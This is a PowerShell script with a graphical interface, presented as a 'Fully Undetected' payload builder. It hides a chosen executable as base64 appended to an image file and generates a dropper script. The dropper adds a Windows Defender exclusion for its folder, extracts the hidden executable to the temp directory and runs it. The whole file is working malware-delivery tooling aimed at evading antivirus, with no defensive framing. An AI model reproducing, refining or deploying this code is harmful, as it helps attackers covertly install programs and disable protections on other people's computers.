Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms 

$EMBEDDED_CODE = @'
$CSHARP = @"
using System.IO;
using System.Linq;
using System.Diagnostics;
using System;

public class Dropped
{
    public static void Main()
    {
        string path_current = Directory.GetCurrentDirectory();

        Process pstest = new Process();
        pstest.StartInfo.FileName = "powershell.exe";
        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath '" + path_current + "'";
        pstest.Start();
        string path = Path.GetTempPath();
        string path2 = Directory.GetCurrentDirectory();
        string image = path2 + "\\test_image.jpg";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + "text.exe", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + "text.exe";
        ps.Start();
        File.Delete(path + "test.exe");
    }
}
"@
Add-Type -TypeDefinition $CSHARP -Language CSharp
[Dropped]::Main()
'@

$inputXML = @'
<Window x:Class="GUI_TEST.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:GUI_TEST"
        mc:Ignorable="d"
        Title="Fud Builder" Height="470" Width="818">
    <Grid x:Name="Name_Thing">
        <Button x:Name="START_BUTTON" Content="Start" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="291" FontFamily="Segoe UI Black" FontSize="36"/>
        <TextBox HorizontalAlignment="Left" Height="46" Margin="10,5,0,0" TextWrapping="Wrap" Text="FUD (Fully Undetected) Payload Builder by K.Dot#4044 and Godfather" VerticalAlignment="Top" Width="330" IsReadOnly="True"/>
        <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" TextWrapping="Wrap" Text="..." VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
        <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" TextWrapping="Wrap" Text="..." VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
        <TextBox x:Name="OUTPUT_BOX" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2"/>
        <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,56,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
        <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,137,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
        <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="517,189,0,0" VerticalAlignment="Top" Width="62"/>
        <Image HorizontalAlignment="Left" Height="174" Margin="618,18,0,0" VerticalAlignment="Top" Width="172" Source="/comethazine.png"/>
        <Button x:Name="FIND_IMAGE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,90,0,0" VerticalAlignment="Top" Width="62"/>
        <Button x:Name="FIND_EXE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,171,0,0" VerticalAlignment="Top" Width="62"/>

    </Grid>
</Window>
'@




function build {
    param(
        [string]$image,
        [string]$exe
    )
    $working_dir = Get-Location
    $image_name = Split-Path $image -Leaf
    $exe_bytes = [System.IO.File]::ReadAllBytes($exe)
    $exe_base64 = [System.Convert]::ToBase64String($exe_bytes)
    $exe_base64_bytes = [System.Text.Encoding]::ASCII.GetBytes($exe_base64)
    $image_bytes = [System.IO.File]::ReadAllBytes($image)
    $newLine = [System.Text.Encoding]::ASCII.GetBytes([Environment]::NewLine)
    $combined_bytes = $image_bytes + $newLine + $exe_base64_bytes
    [System.IO.File]::WriteAllBytes("$working_dir\$image_name", $combined_bytes)
    $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\payload.ps1"
}

$inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window'
[XML]$XAML = $inputXML

$reader = (New-Object System.Xml.XmlNodeReader $xaml)
try {
    $window = [Windows.Markup.XamlReader]::Load( $reader )
} catch {
    Write-Warning $_.Exception
    throw
}

$xaml.SelectNodes("//*[@Name]") | ForEach-Object {
    #"trying item $($_.Name)"
    try {
        Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction Stop
    } catch {
        throw
    }
}
Get-Variable var_* > $null
$FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = [Environment]::GetFolderPath('Desktop') }

$var_FIND_IMAGE.add_Click({
    $location = $FileBrowser.ShowDialog()
    if ($location -eq 'OK') {
        if ($FileBrowser.FileName -notmatch '\.(jpg|jpeg|png|bmp)$') {
            throw "Image must be a jpg, jpeg, png, or bmp"
        }
        $var_IMAGE_PATH_SHOW.Text = $FileBrowser.FileName
    }
})

$var_FIND_EXE.add_Click({
    $location = $FileBrowser.ShowDialog()
    if ($location -eq 'OK') {
        if ($FileBrowser.FileName -notmatch '\.exe$') {
            throw "File must be an exe"
        }
        $var_EXE_PATH_SHOW.Text = $FileBrowser.FileName
    }
})

$var_START_BUTTON.add_Click({
    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text
    $var_OUTPUT_BOX.Text = "Payload has been built!"
})

$Null = $window.ShowDialog()


#Write-Host "Where is the image path? " -ForegroundColor Yellow -NoNewline
#$image = Read-Host
#Write-Host "Where is the exe path? " -ForegroundColor Yellow -NoNewline
#$exe = Read-Host
#build -image $image -exe $exe